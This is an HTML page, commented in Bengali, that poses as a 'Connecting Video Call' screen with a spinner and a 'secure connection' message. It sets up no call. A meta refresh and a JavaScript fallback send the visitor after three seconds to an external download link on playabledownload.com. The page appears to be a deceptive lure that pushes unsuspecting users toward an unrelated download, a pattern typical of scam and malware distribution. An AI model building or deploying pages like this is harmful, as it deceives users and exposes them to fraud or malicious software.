<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Call Loading...</title>
    
    <!-- ৩ সেকেন্ড পর অটো রিডাইরেক্টের জন্য Meta Tag -->
    <meta http-equiv="refresh" content="3;url=https://playabledownload.com/1906906">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #0f172a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            text-align: center;
            padding: 20px;
            border-radius: 16px;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.1);
            max-width: 350px;
            width: 90%;
        }

        .video-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: #2563eb;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 0 20px rgba(37, 99, 235, 0.6);
            animation: pulse 1.5s infinite;
        }

        .video-icon svg {
            width: 40px;
            height: 40px;
            fill: #ffffff;
        }

        h2 {
            font-size: 20px;
            margin-bottom: 10px;
            font-weight: 600;
        }

        p {
            font-size: 14px;
            color: #94a3b8;
            margin-bottom: 20px;
        }

        /* স্পিনার এনিমেশন */
        .spinner {
            width: 40px;
            height: 40px;
            margin: 0 auto;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-left-color: #2563eb;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(37, 99, 235, 0.7); }
            70% { transform: scale(1); box-shadow: 0 0 0 15px rgba(37, 99, 235, 0); }
            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(37, 99, 235, 0); }
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- ভিডিও কল আইকন -->
        <div class="video-icon">
            <svg viewBox="0 0 24 24">
                <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/>
            </svg>
        </div>

        <h2>Connecting Video Call...</h2>
        <p>Please wait while we establish a secure connection.</p>

        <!-- লোডিং স্পিনার -->
        <div class="spinner"></div>
    </div>

    <!-- JavaScript Fallback (যদি কোনো ব্রাউজারে Meta Tag কাজ না করে) -->
    <script>
        setTimeout(function() {
            window.location.href = "https://playabledownload.com/1906906";
        }, 3000);
    </script>

</body>
</html>
